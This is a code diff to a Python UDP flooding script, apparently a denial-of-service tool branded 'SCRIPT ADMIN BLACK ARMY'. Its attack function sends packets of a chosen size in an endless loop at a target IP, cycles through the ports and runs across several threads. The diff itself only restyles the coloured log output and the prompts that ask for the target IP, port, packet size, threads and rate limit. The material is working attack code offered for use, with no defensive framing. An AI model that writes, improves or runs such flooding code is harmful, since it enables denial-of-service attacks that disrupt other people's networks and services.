@@ -121,7 +121,7 @@ def attack(ip: str, port: int, packet_size: int, rate_limit: float):
         while True:
             sock.sendto(data, (ip, port))
             sent += 1
-            log_message(f"\033[100m \033[32mTasbih-Cinta {threading.get_ident()}\033[103m \033[33mSent{sent}\033[0m\033[38;5;154m {ip}:{port}\033[0m")
+            log_message(f"\033[100m \033[32mTasbih-Cinta\033[0m \033[31m- {threading.get_ident()}. \033[103m \033[33mSent{sent}  \033[0m\033[94m{ip}:{port}")
             port = port + 1 if port < 65534 else 1
             time.sleep(rate_limit)
     except KeyboardInterrupt:
@@ -159,16 +159,17 @@ def main():
     print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
     print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
     print(f"\033[37m╚{'═' * 66}╝")
-    ip = input(" [+] Enter Target IP: ").strip()
+    print(f"\033[32m┏━━KunFayz━━━⬣")
+    ip = input("\033[32m┗> Enter Target IP: ").strip()
     if not validate_ip(ip):
         log_message("Invalid IP address provided. Exiting...")
         sys.exit(1)
-
+    
     try:
-        port = int(input(" [+] Enter Starting Port Number (80): ").strip() or 80)
-        packet_size = int(input(" [+] Enter Packet Size (1490 bytes): ").strip() or 1490)
-        threads = int(input(" [+] Enter Number of Threads (4): ").strip() or 4)
-        rate_limit = float(input(" [+] Enter Rate Limit (seconds, 0.01): ").strip() or 0.01)
+        port = int(input("\033[32m┗> Enter Starting Port Number (80): ").strip() or 80)
+        packet_size = int(input("\033[32m┗> Enter Packet Size (1490 bytes): ").strip() or 1490)
+        threads = int(input("\033[32m┗> Enter Number of Threads (4): ").strip() or 4)
+        rate_limit = float(input("\033[32m┗> Enter Rate Limit (seconds, 0.01): ").strip() or 0.01)
     except ValueError:
         log_message("Invalid input provided. Exiting...")
         sys.exit(1)
